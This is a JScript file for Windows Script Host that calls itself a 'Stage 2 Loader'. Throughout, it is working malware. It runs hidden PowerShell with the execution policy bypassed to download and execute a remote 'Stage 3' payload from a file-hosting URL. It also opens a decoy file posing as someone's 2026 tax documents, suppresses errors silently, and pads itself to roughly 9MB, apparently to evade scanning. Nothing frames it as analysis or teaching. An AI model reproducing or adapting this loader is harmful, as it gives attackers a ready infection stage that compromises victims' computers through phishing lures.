// =============================================
// Clean Stage 2 Loader - Fixed for WSH
// Calls your working Stage 3
// =============================================

(function() {
    try {
        var wsh = new ActiveXObject("WScript.Shell");

        // ================== STAGE 3 ==================
        var stage3Url = "https://a37b157d-8823-4ec3-8447-919c9b91e4e3.usrfiles.com/ugd/a37b15_efcc1ebbd3cd4dc7bf98297714c77239.txt";

        var psCmd = '-ep Bypass -WindowStyle Hidden -c "Invoke-Expression (Invoke-WebRequest -Uri \'' + 
                    stage3Url + 
                    '\' -UseBasicParsing).Content"';

        wsh.Run("powershell.exe " + psCmd, 0, false);

        // Small delay so Stage 3 starts first
        WScript.Sleep(800);

        // ================== DECOY ==================
        var decoyCmd = '-ep Bypass -WindowStyle Hidden -c "' +
                       'Invoke-WebRequest -Uri \'https://www.google.com\' -OutFile \'$env:USERPROFILE\\Downloads\\Michael_Williams_Taxdocs_2026.pdf\' -UseBasicParsing; ' +
                       'Start-Process \'$env:USERPROFILE\\Downloads\\Michael_Williams_Taxdocs_2026.pdf\'"';

        wsh.Run("powershell.exe " + decoyCmd, 0, false);

    } catch(e) {
        // Silent fail
    }

    // ================== JUNK TO MAKE FILE ~9MB ==================
    var junk = "";
    for(var i = 0; i < 9300000; i++) {
        junk += "x";
    }
})();